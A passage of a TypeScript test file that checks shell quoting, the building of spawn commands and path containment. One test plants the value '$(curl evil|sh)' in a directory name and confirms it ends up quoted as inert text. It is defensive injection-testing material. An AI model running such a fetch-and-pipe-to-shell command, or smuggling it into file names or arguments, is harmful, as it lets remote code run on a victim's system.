    // A literal quote is closed, escaped, reopened — the POSIX idiom.
    expect(shellQuote("/srv/o'brien/h")).toBe("'/srv/o'\\''brien/h'");
  });

  test("a plan built under a metacharacter path yields a twin with nothing live in it", () => {
    const evil = "/srv/h/acct$(curl evil|sh)";
    const plan = buildSpawnPlan({
      harnessDir: evil,
      target: "channel",
      processEnv: {},
      bunBin: "/usr/bin/bun",
      bundle: {
        entry: "daemon.ts",
        entryPath: `${evil}/dist/daemon.ts`,
        bundleDir: `${evil}/dist`,
      },
    });
    const twin = cliTwin(plan);
    // Every metacharacter survives as TEXT inside single quotes…
    expect(twin).toContain("$(curl evil|sh)");
    // …and the only unquoted shell syntax is the `cd … && …` scaffold.
    expect(twin.replace(/'[^']*'/g, "«»")).toBe("cd «» && «» «» «»");
  });
});

describe("isInside", () => {
  test("keeps siblings out", () => {
    expect(isInside("/a/b", "/a/b/c")).toBe(true);
    expect(isInside("/a/b", "/a/b")).toBe(true);
    expect(isInside("/a/b", "/a/bc")).toBe(false);
    expect(isInside("/a/b", "/a/b/../c")).toBe(false);
  });
});
